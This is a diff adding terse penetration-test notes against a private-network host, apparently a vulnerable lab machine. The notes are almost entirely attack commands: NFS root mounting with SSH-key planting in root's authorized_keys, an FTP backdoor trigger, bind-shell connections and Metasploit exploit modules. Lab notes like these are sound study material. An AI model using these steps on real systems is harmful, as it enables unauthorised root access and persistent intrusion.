@@ -1,0 +1,42 @@
+# nmap -p0-65535 192.168.1.103
+
+# rlogin -l root 192.168.1.103
+
+		- Ports 512, 513, 514 are known as r services. And allow remote access to any host.
+
+# smbclient -L //192.168.1.103
+
+# smbclient  //192.168.1.103/tmp
+
+# rpcinfo -p 192.168.1.103
+
+# showmount -e 192.168.1.103
+
+# ssh-keygen
+
+# mount -t nsf 192.168.1.103:/ /tmp/r00t/
+
+# cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
+
+
+# telnet 192.168.1.103 21
+	- user backdoored:)
+	- pass invalid
+
+# telnet 192.168.1.103 6200 (SHELL)
+	- id;
+	- hostname;
+	- whoami;
+	- ls;
+	- mkdir folder;
+
+# telnet 192.168.1.103 1524 
+	- SHELL
+
+# Running UNREALIRCD IRC daemon. reported with multiples backdoors on it.
+	- MSF(exploit/unix/irc/unreal_ircd_3281_backdoor)
+
+# Metasploit (SHELL)
+	- exploit/unix/misc/distcc_exec
+	- exploit/unix/irc/unreal_ircd_3281_backdoor
+	- auxiliary/admin/smb/samba_symlink_traversal
